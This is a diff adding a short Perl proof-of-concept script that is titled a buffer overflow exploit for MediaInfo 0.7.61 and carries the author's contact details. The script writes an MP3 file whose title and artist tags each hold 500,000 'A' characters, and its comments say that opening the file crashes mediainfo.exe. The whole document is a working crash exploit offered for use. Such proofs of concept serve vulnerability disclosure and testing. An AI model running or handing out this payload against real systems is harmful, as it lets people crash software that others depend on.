@@ -1,0 +1,28 @@
+#!/usr/bin/perl -w
+# Title : Windows Media Player MediaInfo v0.7.61 - Buffer Overflow Exploit
+# Tested on Windows 7 / Server 2008
+# Download Link : https://sourceforge.net/projects/mediainfo/files/binary/mediainfo-gui/0.7.61/
+#
+#
+# Author      :   Mohammad Reza Espargham
+# Linkedin    :   https://ir.linkedin.com/in/rezasp
+# E-Mail      :   reza.espargham@owasp.org
+# Website     :   www.reza.es
+# Twitter     :   https://twitter.com/rezesp
+# FaceBook    :   https://www.facebook.com/reza.espargham
+#
+# Github : github.com/rezasp
+#
+#
+#
+# 1 . run perl code : perl reza.pl
+# 2 . open 1.mp3 by mediainfo.exe
+# 3 . Crashed ;)
+
+use MP3::Tag;
+
+$mp3 = MP3::Tag->new('1.mp3');
+$mp3->title_set('A' x 500000);
+$mp3->artist_set('A' x 500000);
+$mp3->update_tags();  
+$mp3->close();
